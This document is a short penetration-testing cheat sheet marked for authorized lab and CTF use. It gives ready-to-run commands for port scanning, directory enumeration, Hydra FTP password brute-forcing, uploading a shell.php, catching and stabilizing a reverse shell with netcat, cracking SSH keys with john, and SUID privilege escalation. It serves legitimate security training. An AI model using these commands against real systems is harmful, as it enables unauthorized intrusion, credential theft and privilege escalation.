# Tools & Commands — Quick Cheatsheet (lab-only)

> Use these commands only in authorized lab/CTF environments.

## Recon & Port scanning
```bash
# Fast, default NSE + version detection
nmap -sC -sV -oA nmap_output <TARGET>

# Full TCP port range
nmap -p- -sV -T4 <TARGET>

# RustScan as fast front-end to nmap
rustscan -a <TARGET> -- -sC -sV
```

## Web enumeration
```bash
# Directory discovery (gobuster)
gobuster dir -u http://<HOST> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -q -o gobuster_output.txt

# Download files quickly
curl -s -o file.txt http://<HOST>/path/to/file
```

## Brute-force (labs only)
```bash
# Hydra FTP brute-force (example)
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

## FTP basics
```text
ftp <TARGET_IP>
get shell.php
put shell.php
```

## Reverse shells & stabilization
```bash
nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z; stty raw -echo; fg; export TERM=xterm
```

## Hash cracking (john)
```bash
python3 /opt/john/ssh2john.py id_rsa > id_rsa_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
```

## SUID checks and GTFOBins
```bash
find / -perm -4000 2>/dev/null
# Example (if nmap SUID):
nmap --interactive
!sh
```

## Notes
- Document command output and timestamps.
- Sanitize secrets before sharing logs.
- Use tcpdump -w capture.pcap and analyze with Wireshark.
